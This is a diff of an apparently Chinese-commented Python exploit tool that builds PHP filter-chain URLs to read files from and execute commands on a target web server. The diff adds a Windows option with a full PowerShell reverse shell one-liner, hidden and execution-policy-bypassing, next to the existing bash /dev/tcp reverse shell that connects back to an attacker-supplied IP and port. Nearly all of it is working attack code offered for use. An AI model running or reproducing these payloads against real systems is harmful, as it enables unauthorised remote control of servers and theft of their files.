@@ -8,7 +8,7 @@ def build_file_url(base_url, filename):
     return f"{base_url}{quote(payload)}"
 
 # 修改函数签名以接受 encode_chars 和 encode_chars2
-def build_reverse_shell_url(base_url, ip, port, encode_chars=None, encode_chars2=None):
+def build_reverse_shell_url(base_url, ip, port,os, encode_chars=None, encode_chars2=None):
     # 将 payload 分成需要编码的前缀和保持不变的后缀
     php_filter_prefix = "php://filter/"
     filter_content = (
@@ -74,8 +74,16 @@ def build_reverse_shell_url(base_url, ip, port, encode_chars=None, encode_chars2
         "convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp&"
 
     )
-    cmd_payload = "cmd=bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F{ip}%2F{port}%200%3E%261%22"
-    
+    if os == "linux":
+        cmd_payload = "cmd=bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F{ip}%2F{port}%200%3E%261%22"
+    else:
+        cmd_payload = ("powershell%20-nop%20-W%20hidden%20-noni%20-ep%20bypass%20-c%20"
+                       "\"$TCPClient%20=%20New-Object%20Net.Sockets.TCPClient('{ip}',{port});$NetworkStream=$TCPClient.GetStream();"
+                       "$StreamWriter=New-Object%20IO.StreamWriter($NetworkStream);function%20WriteToStream%20($String)%20{[byte[]]$script:Buffer=0..$TCPClient.ReceiveBufferSize"
+                       "|% {0};$StreamWriter.Write($String+'SHELL>');$StreamWriter.Flush()}WriteToStream%20'';while(($BytesRead="
+                       "$NetworkStream.Read($Buffer,0,$Buffer.Length))%20-gt%200){$Command=([text.encoding]::UTF8).GetString($Buffer,0,$BytesRead-1);"
+                       "$Output=try{Invoke-Expression%20$Command%202>&1%20|%20Out-String}%20catch%20{$_|Out-String}WriteToStream%20($Output)}$StreamWriter.Close()\""
+                       "")
     # 第一次编码 - 确保 php://filter/ 不被编码
     if encode_chars:
         chars_to_encode = set(encode_chars.split(','))
@@ -128,7 +136,8 @@ def main():
     
     parser.add_argument('-H', '--header', action='append', 
                       help='Custom HTTP headers (e.g. -H "Authorization: Basic ...")')
-    
+    parser.add_argument('-o', '--os', choices=['linux', 'windows'], default='linux',
+                      help='Target OS (linux or windows), default: linux')
     parser.add_argument('-e', '--encode', 
                       help='Characters to URL encode (e.g. -e "i,y" to encode only i and y characters)')
     
@@ -149,23 +158,20 @@ def main():
             url = build_file_url(args.base_url, args.file)
             response = requests.get(url, headers=headers)
             if response.status_code == 200:
-                try:
-                    response_text = response.text.strip()
-                    if not response_text:
-                        print("Received empty response.")
-                    else:
-                        decoded = base64.b64decode(response_text).decode('utf-8', errors='ignore') # 添加 errors='ignore' 以处理可能的解码错误
-                        print(f"Decoded content:\n{decoded}")
-                except (base64.binascii.Error, UnicodeDecodeError) as decode_error:
-                    print(f"Could not decode base64 or decode UTF-8: {decode_error}")
-                    print(f"Raw response:\n{response.text}") # 打印原始响应以供调试
+                response_text = response.text.strip()
+                if not response_text:
+                    print("Received empty response.")
+                else:
+                    decoded = base64.b64decode(response_text).decode('utf-8', errors='ignore') # 添加 errors='ignore' 以处理可能的解码错误
+                    print(f"Decoded content:\n{decoded}")
             else:
                 print(f"Request failed with status code: {response.status_code}")
                 print(f"Response content:\n{response.text}") # 打印失败时的响应内容
 
         elif args.reverse_shell:
             ip, port = args.reverse_shell
-            url = build_reverse_shell_url(args.base_url, ip, port, args.encode, args.encode2)
+            
+            url = build_reverse_shell_url(args.base_url, ip, port, args.os, args.encode, args.encode2)
             print(f"[*] Using URL: {url}") # 打印生成的 URL 以供调试
             print(f"Sending reverse shell payload to {ip}:{port}...")
             try:
